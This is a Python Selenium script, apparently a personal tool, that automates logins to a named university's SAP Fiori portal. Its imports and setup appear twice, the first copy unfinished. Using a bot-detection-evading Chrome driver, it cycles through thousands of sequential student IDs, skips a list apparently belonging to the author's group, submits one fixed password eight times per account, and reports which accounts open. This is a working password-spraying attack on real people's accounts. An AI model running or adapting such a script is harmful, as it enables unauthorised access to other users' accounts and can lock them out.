import random
import string
from undetected_chromedriver import Chrome
import time
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException, TimeoutException

options = Options()
options.add_argument('--profile-directory=Default')
options.add_argument('--disable-extensions')
options.add_argument('--disable-popup-blocking')

# Open a new Chrome window
browser = Chrome(options=options)
browser.get('https://hub.uol.edu.pk/sap/bc/ui5_ui5/ui2/ushell/shells/abap/Fiorilaunchpad.html')
browser.maximize_window()

# Open a new tab
browser.execute_script("window.open('https://hub.uol.edu.pk/', '_blank')")
time.sleep(10)

# Switch to the new tab
browser.switch_to.window(browser.window_handles[0])

# # Close the previous tab
browser.close()

# Switch to the latest open tab
browser.switch_to.window(browser.window_handles[-1])

# Find the username and password fields by their IDs
username_field = WebDriverWait(browser, 10).until(
    EC.presence_of_element_located((By.ID, "USERNAME_FIELD-inner"))
)
password_field = WebDriverWait(browser, 10).until(
    EC.presence_of_element_located((By.ID, "PASSWORD_FIELD-inner"))
)

from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from undetected_chromedriver import Chrome
from selenium.webdriver.chrome.options import Options
import time

options = Options()
options.add_argument('--profile-directory=Default')
options.add_argument('--disable-extensions')
options.add_argument('--disable-popup-blocking')



# Create a new instance of the Chrome driver
chrome = Chrome(options=options)

# Navigate to a website
chrome.get("https://hub.uol.edu.pk/sap/bc/ui5_ui5/ui2/ushell/shells/abap/Fiorilaunchpad.html")
chrome.maximize_window()
# Open a new tab in the same window and navigate to the given website
chrome.execute_script("window.open('https://hub.uol.edu.pk/', '_blank')")

time.sleep(15)

# Switch to the new tab
chrome.switch_to.window(chrome.window_handles[0])

# # Close the previous tab
chrome.close()

# Switch to the latest open tab
chrome.switch_to.window(chrome.window_handles[-1])

# Find the username and password fields by their IDs
password_field = WebDriverWait(chrome, 10).until(EC.presence_of_element_located((By.ID, "PASSWORD_FIELD-inner")))
password_field.clear()
password_field.send_keys("09ituh9")

apni_saps = [70134621, 70135846, 70141038, 70140685, 70137164, 70136639, 70140348,
             70132014,70120005]

for i in range(70146000, 70150001):
    if i in apni_saps:
        continue
    for j in range(8):
        username_field = WebDriverWait(chrome, 10).until(
            EC.presence_of_element_located((By.ID, "USERNAME_FIELD-inner")))
        username_field.clear()
        username_field.send_keys(str(i))
        password_field = WebDriverWait(chrome, 10).until(
            EC.presence_of_element_located((By.ID, "PASSWORD_FIELD-inner")))
        password_field.clear()
        password_field.send_keys("09ituh9")

        # Click the login button
        login_button = WebDriverWait(chrome, 10).until(EC.element_to_be_clickable(
            (By.CSS_SELECTOR, '#LOGIN_LINK > span.sapMBtnContent.sapMLabelBold.sapUiSraDisplayBeforeLogin')))
        login_button.click()

    try:
        chrome.find_element_by_css_selector('#__xmlview0--appTitle')
        print(f"Logged in successfully with username {i}")
    except:
        print(f"user doomed {i}")
